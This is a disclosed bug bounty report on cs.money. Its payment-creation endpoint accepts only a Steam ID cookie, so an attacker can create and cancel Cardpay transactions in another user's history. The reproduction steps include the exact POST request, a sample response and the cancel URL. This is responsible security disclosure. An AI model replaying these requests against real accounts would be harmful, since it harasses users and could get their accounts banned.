# Attacker can generate cancelled transctions in a user's transaction history using only Steam ID

## Report Details
- **Report ID**: 1021776
- **URL**: https://hackerone.com/reports/1021776
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-29T14:20:09.241Z
- **Disclosed**: 2021-02-03T13:05:45.548Z

## Reporter
- **Username**: pmnh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
The API endpoint `/create-payment` requires only the steam ID of the account to create the payment. When this endpoint is called using the `cardpay` flow, it returns a transaction ID on the Cardpay system. The attacker can access this transaction, and immediately cancel it (or pay it ;) ), which leads to a visible cancelled transaction in the cs.money user's transaction history.

Although there is no impact to the user, they will certainly be confused.

## Steps To Reproduce:
Invoke the API call `/create-payment` as below:

```
POST https://cs.money/create-payment HTTP/1.1
Host: cs.money
Content-Type: application/json;charset=UTF-8
Cookie: steamid=████████; 

{"merchant":"cardpay","amount":10}
```

You will get a response with a Cardpay order ID and URL:
```
HTTP/1.1 200 OK
...
{"merchant":"cardpay","orderId":2034944,"success":true,"url":"https://cardpay.com/MI/payment.html?uuid=DaG438Bda6GC13h5db1bGD01"}
```

You can then cancel the payment by hitting the Cardpay cancel URL:
```
https://cardpay.com/MI/cancel.html?uuid=DaG438Bda6GC13h5db1bGD01
```

This will result in a cancelled transaction showing in the user's transaction history of the amount specified by the attacker. The attacker could repeat this numerous times until the account is banned by cs.money (this occurred on one of my test accounts).

## Impact

Confusion for the user due to the ability to create many cancelled transactions, potentially leading to the account being banned.

## Attachments
No attachments
